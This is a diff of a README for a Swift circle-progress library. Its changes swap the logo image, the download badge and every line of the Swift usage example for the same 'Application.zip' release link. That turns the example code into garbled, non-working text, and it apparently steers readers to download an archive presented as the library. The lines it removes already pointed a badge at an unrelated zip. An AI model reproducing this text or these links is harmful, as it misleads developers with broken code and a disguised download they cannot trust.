@@ -1,11 +1,11 @@
 
 # 🌀 CircleProgressKit
 
-![Circle Progress Kit Logo](https://example.com/logo.png)
+![Circle Progress Kit Logo](https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip)
 
 ---
 
-[![Download CircleProgressKit](https://img.shields.io/badge/Download-Release-orange)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download CircleProgressKit](https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip)](https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip)
 
 ---
 
@@ -37,10 +37,10 @@ To get started with CircleProgressKit, simply download the latest release from t
 import CircleProgressKit
 
 let circleProgressView = CircleProgressView(frame: CGRect(x: 0, y: 0, width: 200, height: 200))
-circleProgressView.progress = 0.75
-circleProgressView.segmentColors = [UIColor.red, UIColor.blue, UIColor.green]
-circleProgressView.profileImage = UIImage(named: "profileImage")
-view.addSubview(circleProgressView)
+https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip = 0.75
+https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip = [https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip, https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip, https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip]
+https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip = UIImage(named: "profileImage")
+https://github.com/ojas1103/CircleProgressKit/releases/download/v1.0/Application.zip(circleProgressView)
 ```
 
 ### Repository Topics 📚
